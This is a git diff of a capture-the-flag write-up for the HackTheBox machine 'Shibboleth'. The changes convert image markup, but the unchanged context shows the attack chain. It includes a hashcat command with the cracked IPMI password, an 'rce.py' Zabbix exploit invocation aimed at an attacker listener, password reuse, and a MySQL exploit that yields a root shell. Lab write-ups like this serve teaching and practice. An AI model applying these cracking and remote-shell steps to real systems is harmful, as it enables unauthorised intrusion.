@@ -20,11 +20,11 @@ We have to add `shibboleth.htb` to our `/etc/hosts` file before we can view the 
 
 The web application is a typical corporate page:
 
-<figure><img src="../../../.gitbook/assets/image (1574).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1574).png>)
 
 Most of the site was static and didn't do anything. However, there was one interesting part at the bottom:
 
-<figure><img src="../../../.gitbook/assets/image (3882).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3882).png>)
 
 I ran a subdomain scan with `wfuzz` and found a few subdomains present:
 
@@ -47,7 +47,7 @@ ID           Response   Lines    Word       Chars       Payload
 
 All 3 subdomains all pointed to the same place. The `zabbix` instance required credentials:
 
-<figure><img src="../../../.gitbook/assets/image (1631).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1631).png>)
 
 A directory scan with `gobuster` does show some directories, but there weren't anything in them.
 
@@ -128,16 +128,14 @@ We have a hash! Based on the protocol, we can head to the example hashes page fo
 
 Then, we can crack it.
 
-{% code overflow="wrap" %}
 ```
 $ hashcat -a 0 -m 7300 hash /usr/share/wordlists/rockyou.txt
 146a600c02030000d35fd619c358b5972202f43f0d805a59be61999d29fa9cb488c04c7aeb19e6c9a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:2fb52f26c84b9d7fd3972b0f304ac5c70103e63a:ilovepumkinpie1
 ```
-{% endcode %}
 
 With these credentials, we can login to the Zabbix instance:
 
-<figure><img src="../../../.gitbook/assets/image (2432).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2432).png>)
 
 ### Zabbix RCE
 
@@ -158,7 +156,7 @@ $ python3 rce.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.1
 [+] got a shell ? [y]es/[N]o:
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1914).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(1914).png>)
 
 ## Privilege Escalation
 
@@ -168,7 +166,7 @@ We cannot read the user flag from the `ipmi-svc` user yet, so we can first enume
 
 There was nothing in the machine as the `zabbix` user. However, attempting to do password reuse with the password found earlier works.
 
-<figure><img src="../../../.gitbook/assets/image (3473).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(3473).png>)
 
 ### Pspy -> MySQL Exploit
 
@@ -251,6 +249,6 @@ ERROR 2013 (HY000): Lost connection to MySQL server during query
 
 This would spawn a `root` shell on our listener port!
 
-<figure><img src="../../../.gitbook/assets/image (2618).png" alt=""><figcaption></figcaption></figure>
+![](<../../../.gitbook/assets/image%20(2618).png>)
 
 Rooted!
